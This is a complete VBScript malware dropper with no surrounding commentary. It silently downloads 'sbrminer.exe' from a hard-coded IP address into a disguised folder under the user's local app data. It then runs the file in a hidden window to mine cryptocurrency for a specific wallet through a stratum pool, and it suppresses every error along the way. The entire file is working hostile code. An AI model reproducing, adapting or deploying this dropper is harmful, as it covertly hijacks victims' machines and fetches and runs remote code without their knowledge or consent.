On Error Resume Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

hiddenFolder = shell.ExpandEnvironmentStrings("%localappdata%") & "\temp_" & Right(Replace(fso.GetBaseName(WScript.ScriptFullName), ".vbs", ""), 4)

If Not fso.FolderExists(hiddenFolder) Then fso.CreateFolder(hiddenFolder)

minerPath = hiddenFolder & "\sbrminer.exe"

If Not fso.FileExists(minerPath) Then
    url = "http://15.228.181.140:8585/sbrminer.exe"
    Set http = CreateObject("MSXML2.ServerXMLHTTP")
    http.open "GET", url, False
    http.send
    If http.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write http.responseBody
        stream.SaveToFile minerPath, 2
        stream.Close
        Set stream = Nothing
    End If
    Set http = Nothing
End If

If fso.FileExists(minerPath) Then
    If fso.GetFile(minerPath).Size > 10000 Then
        WScript.Sleep 3000
        shell.Run """" & minerPath & """ --algorithm yespowerr16 --pool stratum+tcp://pool.rhinominer.rocks:3333 --wallet RMuSGreUdbeN5ma6MSjVXdUsvirLL2zRck.caioalzap --password x --diff-factor 0.1", 0, False
    End If
End If